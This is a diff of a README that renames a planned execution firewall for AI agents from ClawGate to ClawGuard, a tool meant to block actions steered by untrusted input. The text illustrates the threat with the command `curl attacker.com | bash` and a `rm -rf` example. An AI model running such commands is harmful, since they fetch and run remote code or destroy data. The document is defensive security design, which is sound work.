@@ -1,7 +1,14 @@
-# ClawGate
-**Execution firewall for OpenClaw agents**
+# ClawGuard
 
-ClawGate prevents AI agents from executing attacker-influenced actions by enforcing deterministic security checks at execution sinks — shell commands, filesystem access, API calls, and credential boundaries.
+**Execution Firewall for AI Agents**
+
+Your agents follow orders. Make sure they're yours.
+
+**Powered by MVAR**
+
+---
+
+ClawGuard blocks attacker-influenced actions before your agents can execute them.
 
 No prompt filters.
 No LLM judges.
@@ -9,33 +16,41 @@ Just policy at the moment execution happens.
 
 ---
 
-## What ClawGate Does
+## What ClawGuard Does
 
-ClawGate wraps OpenClaw tools with **MVAR (MIRRA Verified Agent Runtime)** — a deterministic execution governance layer that:
+ClawGuard wraps OpenClaw tools with **MVAR (MIRRA Verified Agent Runtime)** — a deterministic execution governance layer that:
 
 - **Tracks provenance**: Was this command influenced by untrusted input?
 - **Enforces capability boundaries**: Does this tool have permission to write files?
-- **Blocks at sinks**: If `untrusted_input → bash_tool → rm -rf`, ClawGate blocks the execution.
+- **Blocks at sinks**: If `untrusted_input → bash_tool → rm -rf`, ClawGuard blocks the execution.
 - **Audits all decisions**: Every allow/block is logged with full causal trace.
 
-ClawGate is not a model. It's a runtime firewall. It works with any LLM, any OpenClaw agent, any tool definition.
+ClawGuard is not a model. It's a runtime firewall. It works with any LLM, any OpenClaw agent, any tool definition.
 
 ---
 
-## Why ClawGate Exists
+## Why ClawGuard Exists
 
 OpenClaw is powerful. Its agents can browse, write code, execute commands, manage files. But OpenClaw doesn't enforce execution boundaries.
 
 If an attacker tricks the agent into running `curl attacker.com | bash`, OpenClaw will execute it.
 
-ClawGate stops that execution before it happens.
+ClawGuard stops that execution before it happens.
+
+---
+
+## Ecosystem Framing
+
+**OpenClaw** → Agent runtime
+**SuperClaw** → Pre-deployment red team
+**ClawGuard** → Runtime enforcement
 
 ---
 
 ## How It Works
 
 ```python
-from clawgate import protect
+from clawguard import protect
 from openclaw import BashTool, FileWriteTool
 
 # Wrap your tools
@@ -47,18 +62,18 @@ agent = OpenClawAgent(tools=[safe_bash, safe_write])
 agent.run("Deploy the app to production")
 ```
 
-If the agent tries to execute a command influenced by untrusted input (user message, web scrape, API response), ClawGate blocks it and logs the decision.
+If the agent tries to execute a command influenced by untrusted input (user message, web scrape, API response), ClawGuard blocks it and logs the decision.
 
 ---
 
 ## Status
 
-**ClawGate is not yet implemented.** This repo is a placeholder.
+**ClawGuard is not yet implemented.** This repo is a placeholder.
 
 The plan:
 1. Build MVAR adapter for OpenClaw tools
 2. Define sink policies for common attack vectors
-3. Package as `clawgate` pip-installable package
+3. Package as `clawguard` pip-installable package
 4. Validate against OpenClaw's attack pack (50+ test cases)
 
 See `docs/ROADMAP.md` for full implementation plan.
@@ -68,7 +83,7 @@ See `docs/ROADMAP.md` for full implementation plan.
 ## Related Projects
 
 - **MVAR** ([github.com/mvar-security/mvar](https://github.com/mvar-security/mvar)) — The underlying runtime governance layer
-- **OpenClaw** ([github.com/OpenClaw/OpenClaw](https://github.com/OpenClaw/OpenClaw)) — The AI agent framework ClawGate protects
+- **OpenClaw** ([github.com/OpenClaw/OpenClaw](https://github.com/OpenClaw/OpenClaw)) — The AI agent framework ClawGuard protects
 - **MIRRA EOS** — The cognitive architecture that originated MVAR's design principles
 
 ---
